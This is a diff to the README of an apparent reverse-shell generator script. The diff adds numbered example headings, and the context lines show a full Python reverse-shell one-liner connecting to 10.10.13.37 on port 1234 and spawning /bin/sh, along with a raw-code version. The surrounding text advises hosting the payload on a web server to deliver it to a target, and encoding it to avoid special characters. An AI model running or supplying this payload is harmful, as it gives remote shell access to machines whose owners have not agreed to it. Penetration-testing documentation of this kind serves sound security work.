@@ -27,12 +27,16 @@ optional arguments:
 
 ## Examples
 
+1. __One-liner__
+
 Generate a __Pyhon__ Reverse Shell __one-liner__.
 ```
 user@host:~$ ./rsg.py python 10.10.13.37 1234
 [SHELL][PYTHON][ONE-LINER]
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.13.37",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
+
+2. __Raw code__
 
 Generate a __Python__ Reverse Shell and print it as __raw code__. This is useful if you want to output the result to a script a file and then __host it on a web server__ to deliver it to the target.
 ```
@@ -46,6 +50,8 @@ os.dup2(s.fileno(),1);
 os.dup2(s.fileno(),2);
 p=subprocess.call(["/bin/sh","-i"]);
 ```
+
+3. __One-liner with encoded payload__
 
 Generate a __Python__ Reverse Shell and print it as an __encoded command__. This is useful to __avoid special characters__.
 ```
